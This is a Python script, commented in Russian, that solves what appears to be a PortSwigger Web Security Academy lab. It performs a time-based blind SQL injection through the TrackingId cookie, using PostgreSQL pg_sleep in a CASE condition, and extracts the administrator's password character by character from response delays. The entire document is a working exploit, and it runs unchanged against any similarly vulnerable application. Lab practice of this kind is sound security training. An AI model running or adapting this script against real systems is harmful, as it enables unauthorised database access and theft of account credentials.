import requests
import time

# Обязательно проверь актуальность URL (лаба могла перезапуститься)
url = "https://0af1002a036c654985a685c700b800b1.web-security-academy.net/"

# Алфавит для перебора (строчные буквы и цифры)
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("[*] Начинаю автоматический подбор пароля...")

for position in range(1, 21):  # Перебираем все 20 символов длины
    for char in alphabet:
        # Пэйлоад с pg_sleep(2) без точки с запятой в конце
        payload = f"ZMNXzncFUVml8OfU'|| CASE WHEN (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(Password, {position}, 1) = '{char}') = 1 THEN pg_sleep(2) ELSE pg_sleep(0) END --"
        
        cookies = {'TrackingId': payload}
        
        # Фиксируем время до отправки запроса
        start_time = time.time()
        response = requests.get(url, cookies=cookies)
        end_time = time.time()
        
        # Считаем, сколько секунд занял ответ
        duration = end_time - start_time
        
        # Если ответ шел дольше 1.8 секунд — символ угадан!
        if duration >= 1.8:
            password += char
            print(f"[+] Символ {position}: '{char}' (Задержка: {duration:.2f} сек) -> Текущий пароль: {password}")
            break

print(f"\n[!] Готово! Итоговый пароль администратора: {password}")

